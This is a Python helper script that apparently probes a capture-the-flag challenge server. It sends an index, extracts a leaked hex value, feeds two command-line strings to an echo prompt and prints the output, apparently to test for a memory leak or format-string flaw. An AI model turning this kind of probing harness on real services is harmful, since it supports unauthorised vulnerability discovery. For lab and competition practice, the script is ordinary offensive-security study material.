#!/usr/bin/env python3
import socket, sys, re
HOST,PORT='chal.secso.cc',4005
def recvuntil(s,tok,timeout=10):
    s.settimeout(timeout); b=b''
    while not b.endswith(tok):
        c=s.recv(1)
        if not c: raise EOFError('closed: %r'%b)
        b+=c
    return b
def run(idx,f1,f2='B'):
    s=socket.create_connection((HOST,PORT),timeout=10)
    recvuntil(s,b'Enter an index: '); s.sendall(idx.encode()+b'\n')
    line=recvuntil(s,b'\n'); m=re.search(rb'0x([0-9a-f]*)',line)
    lk=int(m.group(1),16) if m and m.group(1) else None
    recvuntil(s,b'Enter the first input to be echoed: '); s.sendall(f1.encode('latin1')+b'\n')
    recvuntil(s,b'Enter the second input to be echoed: '); s.sendall(f2.encode('latin1')+b'\n')
    recvuntil(s,b'Echoed output: ')
    s.settimeout(4); out=b''
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            out+=c
    except socket.timeout: pass
    s.close()
    return lk,out.decode('latin1')
if __name__=='__main__':
    lk,out=run('1',sys.argv[1],sys.argv[2] if len(sys.argv)>2 else 'B')
    print('probe-byte:',hex(lk) if lk is not None else None)
    print('out:',repr(out[:600]))
